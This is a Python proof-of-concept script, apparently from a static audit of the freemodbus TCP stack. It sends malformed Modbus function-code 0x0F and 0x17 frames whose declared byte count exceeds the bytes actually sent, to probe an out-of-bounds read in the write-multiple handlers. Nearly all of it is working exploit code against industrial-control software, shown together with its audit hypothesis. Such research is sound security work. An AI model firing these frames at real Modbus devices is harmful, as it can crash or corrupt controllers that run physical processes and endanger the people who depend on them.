#!/usr/bin/env python3
"""freemodbus TCP candidate PoC — FC 0x0F / 0x17 received-length mismatch.

Hypothesis (from static audit):
  Multiple write-multiple handlers validate the *declared* byte count against a
  value *derived from the count field*, but do NOT validate that the *actual
  received PDU length* (`usLen`) covers that byte count.  If the app callback
  trusts the count and copies `bytecount` bytes from the frame, a short frame
  with a large declared count drives an OOB read past the received PDU.

  Handler check summary (mbfuncholding.c / mbfunccoils.c):
    0x10 WriteMultipleHolding : guarded  (ucRegByteCount == *usLen - 6)
    0x0F WriteMultipleCoils   : NOT guarded (only usCoilCnt <= 0x07B0 + verify)
    0x17 RWMulHolding         : NOT guarded (only 2*usRegWriteCount == byteCnt)

Usage: ./drive_freemodbus.py [--port 502] [--fc 0f|17] [--count N] [--short]
"""
import socket, struct, sys, time, argparse

MBAP = 6  # TID(2) + PID(2) + LEN(2); UID+PDU follow

def mbap(tid, pid, unit, pdu):
    ln = len(pdu) + 1  # UID byte
    return struct.pack(">HHHB", tid, pid, ln, unit) + pdu

def fc0f_pdu(coil_addr, coil_cnt, bytecnt, data):
    return b"\x0f" + struct.pack(">HHB", coil_addr, coil_cnt, bytecnt) + data

def fc17_pdu(rst, rcnt, wst, wcnt, bcnt, data):
    return b"\x17" + struct.pack(">HHHHB", rst, rcnt, wst, wcnt, bcnt) + data

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=502)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--fc", choices=["0f", "17", "10"], default="0f")
    ap.add_argument("--count", type=int, default=1968)   # 0x07B0 max coils
    ap.add_argument("--short", action="store_true", help="send only a short PDU")
    args = ap.parse_args()

    if args.fc == "0f":
        # coil_cnt = args.count (1968) -> bytecnt = 246 (verified). SEND NO data.
        bytecnt = (args.count + 7) // 8
        pdu = fc0f_pdu(0, args.count, bytecnt, b"" if args.short else b"\xff" * bytecnt)
    elif args.fc == "17":
        # write count up to 121 -> bytecnt 242
        wcnt = min(args.count, 121)
        bytecnt = 2 * wcnt
        pdu = fc17_pdu(0, 10, 0, wcnt, bytecnt, b"" if args.short else b"\xaa" * bytecnt)
    else:  # 0x10 guarded reference
        bytecnt = 2 * min(args.count, 120)
        pdu = b"\x10" + struct.pack(">HHB", 0, min(args.count, 120), bytecnt) + \
              (b"" if args.short else b"\xbb" * bytecnt)

    print(f"[*] FC=0x{args.fc} PDU len={len(pdu)} (short={args.short}) "
          f"count field -> bytecnt={bytecnt}")
    s = socket.create_connection((args.host, args.port), timeout=5)
    full = mbap(1, 0, 0, pdu)
    print(f"[*] sending MBAP+PDU: {full.hex()}")
    s.sendall(full)
    time.sleep(0.4)
    try:
        resp = s.recv(4096)
        print(f"[*] resp ({len(resp)} B): {resp.hex()}")
        # decode: if <= MBAP+3 it's an exception (fc|0x80, code)
        if len(resp) > 7:
            fc = resp[7]
            is_err = fc & 0x80
            print(f"[+] FC=0x{fc:02x} {'EXCEPTION code='+str(resp[8]) if is_err else 'OK'}")
        else:
            print("[+] short/closed")
    except socket.timeout:
        print("[+] timeout (no resp)")
    s.close()

if __name__ == "__main__":
    main()